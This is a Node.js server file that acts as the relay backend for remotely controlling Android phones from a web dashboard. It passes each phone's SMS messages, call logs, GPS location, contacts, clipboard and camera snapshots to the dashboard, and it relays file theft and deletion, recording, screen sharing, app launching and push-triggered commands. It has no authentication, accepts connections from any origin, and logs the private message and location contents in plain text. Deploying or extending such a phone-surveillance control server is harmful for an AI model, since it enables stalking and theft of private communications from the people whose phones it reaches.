require('dotenv').config();

const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: '*',
    methods: ['GET', 'POST'],
    credentials: true
  }
});

const publicPath = path.join(__dirname, 'public');
if (!fs.existsSync(publicPath)) {
  console.error(`FATAL: Public directory not found at: ${publicPath}`);
  process.exit(1);
}
app.use(express.static(publicPath));

// Enable JSON body parsing for API endpoints
app.use(express.json());

// In-memory store for FCM tokens mapped by device ID
const fcmTokens = new Map();

// Endpoint for the Android app to register/update its FCM token
app.post('/api/fcm-token', (req, res) => {
  const { token, deviceId } = req.body;
  if (!token || !deviceId) {
    return res.status(400).json({ error: 'Missing token or deviceId' });
  }
  fcmTokens.set(deviceId, token);
  console.log(`[FCM] Registered token for device: ${deviceId} -> ${token.substring(0, 15)}...`);
  res.json({ success: true });
});

// Endpoint for the web client dashboard to trigger a start/stop command via FCM
app.post('/api/fcm/send', async (req, res) => {
  const { deviceId, command } = req.body;
  if (!deviceId || !command) {
    return res.status(400).json({ error: 'Missing deviceId or command' });
  }

  const token = fcmTokens.get(deviceId);
  if (!token) {
    return res.status(404).json({ error: 'No FCM token registered for this device' });
  }

  console.log(`[FCM] Sending command: ${command} to device: ${deviceId}`);
  
  // NOTE: In a production environment, you would use the 'firebase-admin' SDK here.
  // We'll write the sending logic using a standard fetch to the FCM legacy API 
  // or HTTP v1 API. Since the user might be using legacy keys or a service account:
  // For dual-use flexibility, we log it and attempt legacy API if a key exists,
  // otherwise we stub it with a clear diagnostic log.
  const serverKey = process.env.FIREBASE_SERVER_KEY;
  if (!serverKey) {
    console.warn('[FCM] FIREBASE_SERVER_KEY env var not set. Cannot send real push.');
    return res.status(501).json({ 
      error: 'Firebase Server Key not configured on server. Check FIREBASE_SERVER_KEY.', 
      token: token 
    });
  }

  try {
    const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
    const response = await fetch('https://fcm.googleapis.com/fcm/send', {
      method: 'POST',
      headers: {
        'Authorization': `key=${serverKey}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        to: token,
        data: { command: command }
      })
    });
    const result = await response.json();
    console.log('[FCM] Push result:', result);
    res.json({ success: true, result });
  } catch (e) {
    console.error('[FCM] Push failed:', e);
    res.status(500).json({ error: e.message });
  }
});

app.use((req, res, next) => {
  console.log(`HTTP request: ${req.method} ${req.url}`);
  next();
});

app.get('*', (req, res) => {
  const indexPath = path.join(publicPath, 'index.html');
  if (fs.existsSync(indexPath)) {
    console.log(`Serving index.html for ${req.url}`);
    res.sendFile(indexPath);
  } else {
    console.error(`FATAL: index.html not found at: ${indexPath}`);
    res.status(404).send('index.html not found');
  }
});

let webClients = new Set();
let androidClients = new Set();

io.on('connection', socket => {
  console.log(`Client connected: ${socket.id} from ${socket.handshake.address}`);
  socket.emit('id', socket.id);

  socket.on('identify', (type) => {
    console.log(`Client ${socket.id} identified as: ${type}`);
    if (type === 'web') {
      webClients.add(socket.id);
      androidClients.forEach(androidId => {
        console.log(`Notifying Android ${androidId} about web client ${socket.id}`);
        io.to(androidId).emit('web-client-ready', socket.id);
        io.to(socket.id).emit('android-client-ready', androidId);
      });
    } else if (type === 'android') {
      androidClients.add(socket.id);
      webClients.forEach(webId => {
        console.log(`Notifying Android ${socket.id} about web client ${webId}`);
        socket.emit('web-client-ready', webId);
        io.to(webId).emit('android-client-ready', socket.id);
      });
    }
    console.log(`Clients - Web: ${webClients.size}, Android: ${androidClients.size}`);
  });

  socket.on('web-client-ready', (id) => {
    if (id !== socket.id) {
      console.warn(`Invalid web-client-ready ID: ${id}, expected: ${socket.id}`);
      return;
    }
    console.log(`Web client ${id} announced readiness`);
    webClients.add(id);
    androidClients.forEach(androidId => {
      console.log(`Notifying Android ${androidId} about web client ${id}`);
      io.to(androidId).emit('web-client-ready', id);
    });
  });

  socket.on('signal', data => {
    console.log(`Relaying signal from ${data.from} to ${data.to}: ${data.signal.type || 'candidate'}`);
    console.log(`Signal content: ${JSON.stringify(data.signal)}`);
    if (data.to && io.sockets.sockets.get(data.to)) {
      io.to(data.to).emit('signal', data);
      console.log(`Signal delivered to ${data.to}`);
    } else {
      console.warn(`Recipient ${data.to} not found for signal`);
      socket.emit('error', { message: `Recipient ${data.to} not found`, code: 'RECIPIENT_NOT_FOUND' });
    }
  });

  socket.on('notification', data => {
    console.log(`Relaying notification from ${data.from} to ${data.to}`);
    console.log(`Notification content: ${JSON.stringify(data.notification)}`);
    if (data.to && io.sockets.sockets.get(data.to)) {
      io.to(data.to).emit('notification', data);
      console.log(`Notification delivered to ${data.to}`);
    } else {
      console.warn(`Recipient ${data.to} not found for notification`);
      socket.emit('error', { message: `Recipient ${data.to} not found for notification`, code: 'RECIPIENT_NOT_FOUND' });
    }
  });

  socket.on('call_log', data => {
    console.log(`Relaying call log from ${data.from} to ${data.to}`);
    console.log(`Call log content: ${JSON.stringify(data.call_logs)}`);
    if (data.to && io.sockets.sockets.get(data.to)) {
      io.to(data.to).emit('call_log', data);
      console.log(`Call log delivered to ${data.to}`);
    } else {
      console.warn(`Recipient ${data.to} not found for call log`);
      socket.emit('error', { message: `Recipient ${data.to} not found for call log`, code: 'RECIPIENT_NOT_FOUND' });
    }
  });

  socket.on('sms', data => {
    console.log(`Relaying SMS from ${data.from} to ${data.to}`);
    console.log(`SMS content: ${JSON.stringify(data.sms_messages)}`);
    if (data.to && io.sockets.sockets.get(data.to)) {
      io.to(data.to).emit('sms', data);
      console.log(`SMS delivered to ${data.to}`);
    } else {
      console.warn(`Recipient ${data.to} not found for SMS`);
      socket.emit('error', { message: `Recipient ${data.to} not found for SMS`, code: 'RECIPIENT_NOT_FOUND' });
    }
  });

  socket.on('location', data => {
    console.log(`Relaying location from ${data.from} to ${data.to}`);
    console.log(`Location content: lat=${data.latitude}, lng=${data.longitude}`);
    if (data.to && io.sockets.sockets.get(data.to)) {
      io.to(data.to).emit('location', data);
      console.log(`Location delivered to ${data.to}`);
    } else {
      console.warn(`Recipient ${data.to} not found for location`);
      socket.emit('error', { message: `Recipient ${data.to} not found for location`, code: 'RECIPIENT_NOT_FOUND' });
    }
  });

  // Generic Command & Event Relaying between Web and Android
  const relayEvents = [
    // File Explorer Events
    'fs:list', 'fs:files', 'fs:download', 'fs:download_ready', 'fs:delete', 
    'fs:download_start', 'fs:download_chunk', 'fs:download_complete', 
    'fs:download_error', 'fs:delete_result', 'fs:upload_start', 'fs:upload_chunk',
    'fs:upload_complete',
    // Remote Commands
    'cmd:ping', 'cmd:stop', 'cmd:record', 'cmd:camera_switch', 'cmd:screen_share',
    'cmd:get_apps', 'cmd:get_contacts', 'cmd:sync_notifications', 'cmd:vibrate', 
    'cmd:toast', 'cmd:open_url', 'cmd:flashlight', 'cmd:set_volume', 
    'cmd:set_brightness', 'cmd:ring', 'cmd:set_quality', 'cmd:set_gps_interval', 
    'cmd:launch_app', 'cmd:toggle_sensors', 'cmd:get_network', 'cmd:take_snapshot',
    'cmd:get_clipboard', 'cmd:set_clipboard', 'cmd:tts_speak',
    // Custom Data Responses
    'apps_list', 'contacts_list', 'device_info', 'sensor_data', 'network_info',
    'snapshot_data', 'clipboard_data'
  ];

  console.log('Registering relay event handlers');
  relayEvents.forEach(event => {
    socket.on(event, data => {
      console.log(`Relaying ${event} from ${socket.id}`);
      
      let targetId = null;
      let payload = data;

      if (typeof data === 'object' && data !== null && data.to) {
        targetId = data.to;
      }
      
      if (targetId && io.sockets.sockets.get(targetId)) {
        io.to(targetId).emit(event, payload);
        console.log(`${event} relayed to ${targetId}`);
      } else {
        // Fallback: route based on sender type
        if (webClients.has(socket.id)) {
          androidClients.forEach(id => io.to(id).emit(event, payload));
          console.log(`${event} broadcast to all Android clients`);
        } else if (androidClients.has(socket.id)) {
          webClients.forEach(id => io.to(id).emit(event, payload));
          console.log(`${event} broadcast to all Web clients`);
        } else {
          console.warn(`Could not route ${event} from ${socket.id}`);
        }
      }
    });
  });

  socket.on('disconnect', () => {
    console.log(`Client disconnected: ${socket.id}`);
    const wasWeb = webClients.delete(socket.id);
    const wasAndroid = androidClients.delete(socket.id);
    if (wasWeb) {
      androidClients.forEach(androidId => {
        io.to(androidId).emit('web-client-disconnected', socket.id);
      });
    }
    if (wasAndroid) {
      webClients.forEach(webId => {
        io.to(webId).emit('android-client-disconnected', socket.id);
      });
    }
    console.log(`Clients - Web: ${webClients.size}, Android: ${androidClients.size}`);
  });

  socket.on('error', (error) => {
    console.error(`Socket error from ${socket.id}:`, error);
  });
});

server.on('error', (error) => {
  console.error('Server error:', error);
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running at http://0.0.0.0:${PORT} (accessible at http://<Your Server IP Address>:${PORT})`);
});

process.on('SIGINT', () => {
  console.log('\nShutting down server...');
  server.close(() => {
    console.log('Server shut down gracefully');
    process.exit(0);
  });
});